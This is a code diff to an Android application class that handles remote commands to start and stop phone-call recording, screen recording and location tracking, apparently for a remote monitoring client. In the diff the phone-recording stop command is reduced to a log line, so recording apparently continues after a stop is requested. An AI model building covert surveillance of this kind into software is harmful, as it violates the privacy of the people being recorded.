@@ -12,13 +12,11 @@ import android.widget.Toast;
 import com.view.core.activitys.MainActivity;
 import com.view.core.activitys.PhoneRecordActivity;
 import com.view.core.activitys.ScreenRecordActivity;
+import com.view.core.services.ScreenUtil;
 import com.view.core.thread.ClientThread;
 import com.view.core.thread.Constant;
 import com.view.core.thread.OnClientListener;
 import com.view.core.utils.LocationUtil;
-
-import org.json.JSONException;
-import org.json.JSONObject;
 
 /**
  * @author: yechenyu
@@ -141,7 +139,8 @@ public class MyApplication extends Application {
                 startActivity(intent);
             }else if(cmd.equals(Constant.CMD_STOP_REMOTE_PHONE)){
                 if(mPhoneServiceConnection != null){
-                    unbindService(mPhoneServiceConnection);
+                    Log.d(TAG, "onCommand: unbindservice");
+//                    unbindService(mPhoneServiceConnection);
                 }
 
 
@@ -160,7 +159,8 @@ public class MyApplication extends Application {
                 startActivity(intent);
             }else if(cmd.equals(Constant.CMD_STOP_REMOTE_SCREEN)){
                 if(mScreenServiceConnection != null){
-                    unbindService(mScreenServiceConnection);
+                    Log.d(TAG, "onCommand: unbindservice");
+                    ScreenUtil.stopScreenRecord(mContext);
                 }
             }
         }
@@ -175,5 +175,11 @@ public class MyApplication extends Application {
 
         }
     };
+
+    @Override
+    public void onTerminate(){
+        super.onTerminate();
+        LocationUtil.getInstance().destoryLocationManager();
+    }
 
 }
